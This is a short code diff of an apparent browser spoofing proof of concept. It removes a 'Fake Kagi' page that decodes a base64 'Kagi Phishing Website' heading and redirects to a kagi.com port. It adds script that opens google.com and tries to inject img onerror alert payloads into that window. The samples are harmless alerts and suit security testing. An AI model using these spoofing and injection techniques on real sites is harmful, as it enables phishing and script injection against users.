@@ -1,16 +1,11 @@
-<html>
-<title>Fake Kagi</title>
-<body>
 <script>
-function spoof()
-{
-var data =
-'PGh0bWw+PGJvZHk+PGgxIGFsaWduPSJjZW50ZXIiPkthZ2kgUGhpc2hpbmcgV2Vic2l0ZTwvaDE+PC9ib2R5PjwvaHRtbD4='; // base64 encoded html content
-document.body.innerHTML=atob(data);
-window.location.assign("https://www.kagi.com:8080");
-}
-setInterval(spoof(),100000);
+  function y() {
+    x = open('https://www.google.com', '_top'),
+    x.document.title = '', 
+    x.document.body.innerHTML = 
+      '<img/src=\"\"onerror=\"alert(&quot;this is from google&quot;)\">' +
+      '<img/src=\"\"onerror=\"alert(&quot;this is from google&quot;)\">' +
+      '<img/src=\"\"onerror=\"alert(&quot;this is from google&quot;)\">'
+   };
+   setTimeout(y, 10);
 </script>
-</script>
-</body>
-</html>
